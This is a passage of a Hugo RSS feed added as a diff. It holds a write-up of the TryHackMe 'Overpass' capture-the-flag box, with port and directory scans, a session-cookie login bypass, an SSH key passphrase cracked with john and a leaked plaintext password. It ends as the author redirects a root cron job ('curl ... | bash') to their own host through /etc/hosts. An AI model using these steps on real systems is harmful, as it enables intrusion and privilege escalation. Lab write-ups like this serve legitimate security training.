@@ -1,0 +1,1158 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Crontab on 0000FF</title><link>https://simonefelici.github.io/tags/crontab/</link><description>Recent content in Crontab on 0000FF</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 03 Jan 2024 10:00:00 +0100</lastBuildDate><atom:link href="https://simonefelici.github.io/tags/crontab/index.xml" rel="self" type="application/rss+xml"/><item><title>Overpass Writeup THM</title><link>https://simonefelici.github.io/p/overpass-writeup-thm/</link><pubDate>Wed, 03 Jan 2024 10:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/overpass-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png" alt="Featured image of post Overpass Writeup THM" />&lt;p>The first thing that I am going to do is a nmap scna:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.192.193
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-01 09:30 EST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.192.193
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.059s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 7.19 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From there we can see that the host is running ssh and a web page, let’s see what;s in the web page.&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>Looking at the source code I have found this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Overpass allows you to securely store different
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> passwords &lt;span class="k">for&lt;/span> every service, protected using military grade
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;lt;!--Yeah right, just because the Romans used it doesn&lt;span class="err">&amp;#39;&lt;/span>t make it military grade, change this?--&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cryptography to keep you safe.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The commented part can be a hint that the password are stored using ROT13.&lt;/p>
+&lt;p>After that I ran a directory discovery scan:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.192.193/FUZZ -w /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.192.193/FUZZ
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">aboutus &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">admin &lt;span class="o">[&lt;/span>Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">css &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">downloads &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 71ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">img &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 57ms&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">338&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:36&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Going into the admin page I got meeted with a login form.&lt;/p>
+&lt;p>This login form loads a script:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">statusOrCookie&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;Incorrect credentials&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> loginStatus.textContent &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;Incorrect Credentials&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> passwordBox.value&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Cookies.set&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SessionToken&amp;#34;&lt;/span>,statusOrCookie&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> window.location &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/admin&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This script bascially allows you to create a token named SessionToken, and make a value different from “Incorrect credentials” and gives you access in the admin page&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>We found out a ssh key, now I am going to try and access james account with it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chmod &lt;span class="m">400&lt;/span> id_rsa
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ ssh -i id_rsa james@10.10.192.193
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase &lt;span class="k">for&lt;/span> key &lt;span class="s1">&amp;#39;id_rsa&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Seems like it wants a passphrase.&lt;/p>
+&lt;p>We can retrieve that with John:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh2john id_rsa &amp;gt; id.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>kali㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ john --wordlist&lt;span class="o">=&lt;/span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt id.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using default input encoding: UTF-8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Loaded &lt;span class="m">1&lt;/span> password &lt;span class="nb">hash&lt;/span> &lt;span class="o">(&lt;/span>SSH, SSH private key &lt;span class="o">[&lt;/span>RSA/DSA/EC/OPENSSH 32/64&lt;span class="o">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>KDF/cipher &lt;span class="o">[&lt;/span>&lt;span class="nv">0&lt;/span>&lt;span class="o">=&lt;/span>MD5/AES &lt;span class="nv">1&lt;/span>&lt;span class="o">=&lt;/span>MD5/3DES &lt;span class="nv">2&lt;/span>&lt;span class="o">=&lt;/span>Bcrypt/AES&lt;span class="o">])&lt;/span> is &lt;span class="m">0&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Cost &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>iteration count&lt;span class="o">)&lt;/span> is &lt;span class="m">1&lt;/span> &lt;span class="k">for&lt;/span> all loaded hashes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Will run &lt;span class="m">4&lt;/span> OpenMP threads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Press &lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> or Ctrl-C to abort, almost any other key &lt;span class="k">for&lt;/span> status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;redacted&amp;gt; &lt;span class="o">(&lt;/span>id_rsa&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1g 0:00:00:00 DONE &lt;span class="o">(&lt;/span>2024-01-01 09:58&lt;span class="o">)&lt;/span> 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pimentel..handball
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Use the &lt;span class="s2">&amp;#34;--show&amp;#34;&lt;/span> option to display all of the cracked passwords reliably
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Session completed.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And it worked:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -i id_rsa james@10.10.192.193
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter passphrase &lt;span class="k">for&lt;/span> key &lt;span class="s1">&amp;#39;id_rsa&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 18.04.4 LTS &lt;span class="o">(&lt;/span>GNU/Linux 4.15.0-108-generic x86_64&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Management: https://landscape.canonical.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Support: https://ubuntu.com/advantage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System information as of Mon Jan &lt;span class="m">1&lt;/span> 15:00:25 UTC &lt;span class="m">2024&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> System load: 0.12 Processes: &lt;span class="m">88&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Usage of /: 22.3% of 18.57GB Users logged in: &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Memory usage: 13% IP address &lt;span class="k">for&lt;/span> eth0: 10.10.192.193
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Swap usage: 0%
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> packages can be updated.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> updates are security updates.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Sat Jun &lt;span class="m">27&lt;/span> 04:45:40 &lt;span class="m">2020&lt;/span> from 192.168.170.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">james@overpass-prod:~$ whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">james
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Once there I found this, in the .overpass file:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[{&lt;/span>&lt;span class="s2">&amp;#34;name&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;System&amp;#34;&lt;/span>,&lt;span class="s2">&amp;#34;pass&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;saydrawnlyingpicture&amp;#34;&lt;/span>&lt;span class="o">}]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Which is James’s password&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/crontab
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># /etc/crontab: system-wide crontab&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># command to install the new version when you edit this file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># and files in /etc/cron.d. These files also have username fields,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># that none of the other crontabs do.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SHELL&lt;/span>&lt;span class="o">=&lt;/span>/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># m h dom mon dow user command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">17&lt;/span> * * * * root &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.hourly
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">25&lt;/span> &lt;span class="m">6&lt;/span> * * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.daily &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> &lt;span class="m">6&lt;/span> * * &lt;span class="m">7&lt;/span> root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.weekly &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">52&lt;/span> &lt;span class="m">6&lt;/span> &lt;span class="m">1&lt;/span> * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.monthly &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Update builds from latest code&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">* * * * * root curl overpass.thm/downloads/src/buildscript.sh &lt;span class="p">|&lt;/span> bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Looks like there is a crontab running which uses curl totake the buildscript.sh and run that.&lt;/p>
+&lt;p>From there I just edited the /etc/hosts file and I addes my IP, so now when it will try to retrieve the script, it will retrive it from me.&lt;/p>
+&lt;p>So I made this script inside a /downloads/src/ folder:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
